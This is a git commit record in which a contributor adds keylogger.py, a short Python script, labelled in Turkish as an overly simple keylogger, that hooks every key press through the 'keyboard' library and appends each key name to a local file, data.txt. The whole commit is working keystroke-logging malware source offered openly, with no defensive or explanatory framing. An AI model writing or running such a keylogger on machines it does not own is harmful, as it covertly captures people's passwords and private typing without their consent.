32942cbdbb52529e6624a4d93085b0e58990db29
kadirhan <neurote420@gmail.com>
2025-04-04 19:25:38 +0300

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,13 @@
+# fazla basit keylogger GEREKSİZ BASİT
+
+import keyboard
+
+log_file = 'data.txt'
+
+def on_key_press(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.name))
+
+keyboard.on_press(on_key_press)
+
+keyboard.wait()
